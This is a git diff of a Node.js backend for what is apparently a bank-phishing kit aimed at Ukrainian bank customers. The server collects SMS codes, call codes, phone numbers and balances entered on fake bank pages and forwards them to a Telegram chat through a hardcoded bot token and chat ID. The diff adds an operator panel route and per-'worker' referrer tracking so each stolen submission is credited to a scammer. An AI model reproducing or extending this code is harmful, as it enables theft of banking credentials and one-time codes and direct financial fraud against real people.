@@ -3,16 +3,13 @@ const cors = require('cors');
 const TelegramBot = require('node-telegram-bot-api');
 const WebSocket = require('ws');
 const path = require('path');
-require('dotenv').config();
 
-// =======================================================================
-// --- НАСТРОЙКИ: Используйте env vars ---
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7607171529:AAF4Tch8CyVujvaMhN33_tlasoGAHVmxv64';
-const CHAT_ID = process.env.CHAT_ID || '-4970332008';
+// НАСТРОЙКИ
+const TELEGRAM_BOT_TOKEN = '7607171529:AAF4Tch8CyVujvaMhN33_tlasoGAHVmxv64';
+const CHAT_ID = '-4970332008';
 const WEBHOOK_URL = 'https://new-l8h6.onrender.com/bot' + TELEGRAM_BOT_TOKEN;
-// =======================================================================
 
-// --- СПИСОК БАНКІВ ДЛЯ КНОПКИ "ЗАПРОС" ---
+// СПИСОК БАНКОВ ДЛЯ КНОПКИ "ЗАПРОС"
 const banksForRequestButton = [
     'Райффайзен', 'Альянс', 'ПУМБ', 'OTP Bank',
     'Восток', 'Izibank', 'Укрсиб'
@@ -22,15 +19,19 @@ const app = express();
 app.use(express.json());
 app.use(cors());
 
-// Логирование всех запросов для дебага
+// Логирование запросов
 app.use((req, res, next) => {
     console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - Body: ${JSON.stringify(req.body)}`);
     next();
 });
 
-// Обслуживание index.html из корня
+// Обслуживание файлов из корня
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+app.get('/panel', (req, res) => {
+    res.sendFile(path.join(__dirname, 'panel.html'));
 });
 
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
@@ -42,17 +43,17 @@ bot.setWebHook(WEBHOOK_URL).then(() => {
     console.error('Error setting webhook:', err);
 });
 
-// Тестовое сообщение при запуске
+// Тестовое сообщение
 bot.sendMessage(CHAT_ID, 'Сервер запустился! Тест от ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));
 
-// Маршрут для Telegram webhook
+// Тест бота
+bot.getMe().then(me => console.log(`Bot started: @${me.username}`)).catch(err => console.error('Bot error:', err));
+
+// Webhook для Telegram
 app.post('/bot' + TELEGRAM_BOT_TOKEN, (req, res) => {
     bot.processUpdate(req.body);
     res.sendStatus(200);
 });
-
-// Тест бота
-bot.getMe().then(me => console.log(`Bot started: @${me.username}`)).catch(err => console.error('Bot error:', err));
 
 const server = require('http').createServer(app);
 const wss = new WebSocket.Server({ server });
@@ -88,9 +89,19 @@ wss.on('connection', (ws) => {
 
 app.post('/api/submit', (req, res) => {
     console.log('API /submit:', req.body);
-    const { sessionId, isFinalStep, ...stepData } = req.body;
+    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
 
-    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, data keys: ${Object.keys(stepData).join(', ')}`); // Дебаг лог
+    // Декодируем referrer из Base64
+    let workerNick = 'unknown';
+    try {
+        if (referrer && referrer !== 'unknown') {
+            workerNick = atob(referrer);
+        }
+    } catch (e) {
+        console.error('Error decoding referrer:', e);
+    }
+
+    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, data keys: ${Object.keys(stepData).join(', ')}`);
 
     const existingData = sessions.get(sessionId) || { visitCount: 0 };
     const newData = { ...existingData, ...stepData };
@@ -100,6 +111,7 @@ app.post('/api/submit', (req, res) => {
         let message = `<b>🔔 Отримано код із дзвінка (Ощадбанк)!</b>\n\n`;
         message += `<b>Код:</b> <code>${newData.call_code_input}</code>\n`;
         message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
+        message += `<b>Worker:</b> @${workerNick}\n`;
         bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         return res.status(200).json({ message: 'Call code received' });
     }
@@ -126,6 +138,7 @@ app.post('/api/submit', (req, res) => {
         if (newData.balance) message += `<b>Поточний баланс:</b> <code>${newData.balance}</code>\n`;
         const visitText = newData.visitCount === 1 ? 'NEW' : `${newData.visitCount} раз`;
         message += `<b>Кількість переходів:</b> ${visitText}\n`;
+        message += `<b>Worker:</b> @${workerNick}\n`;
 
         sendToTelegram(message, sessionId, newData.bankName);
     }
@@ -135,14 +148,26 @@ app.post('/api/submit', (req, res) => {
 
 app.post('/api/sms', (req, res) => {
     console.log('API /sms:', req.body);
-    const { sessionId, code } = req.body;
-    console.log(`SMS for ${sessionId}: code=${code}`); // Дебаг лог
+    const { sessionId, code, referrer } = req.body;
+
+    // Декодируем referrer из Base64
+    let workerNick = 'unknown';
+    try {
+        if (referrer && referrer !== 'unknown') {
+            workerNick = atob(referrer);
+        }
+    } catch (e) {
+        console.error('Error decoding referrer:', e);
+    }
+
+    console.log(`SMS for ${sessionId}: code=${code}`);
     const sessionData = sessions.get(sessionId);
     if (sessionData) {
         let message = `<b>Отримано SMS!</b>\n\n`;
         message += `<b>Код:</b> <code>${code}</code>\n`;
         message += `<b>Номер телефону:</b> <code>${sessionData.phone}</code>\n`;
         message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
+        message += `<b>Worker:</b> @${workerNick}\n`;
         bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         console.log(`SMS code received for session ${sessionId}`);
         res.status(200).json({ message: 'OK' });
@@ -221,12 +246,12 @@ bot.on('callback_query', (callbackQuery) => {
     }
 });
 
-// Обработка ошибок Telegram polling (если включено, но мы на webhook)
+// Обработка ошибок Telegram
 bot.on('polling_error', (error) => {
     console.error('Telegram polling error:', error);
 });
 
-// Глобальная обработка ошибок Express
+// Глобальная обработка ошибок
 app.use((err, req, res, next) => {
     console.error('Server error:', err);
     res.status(500).json({ message: 'Internal Server Error' });
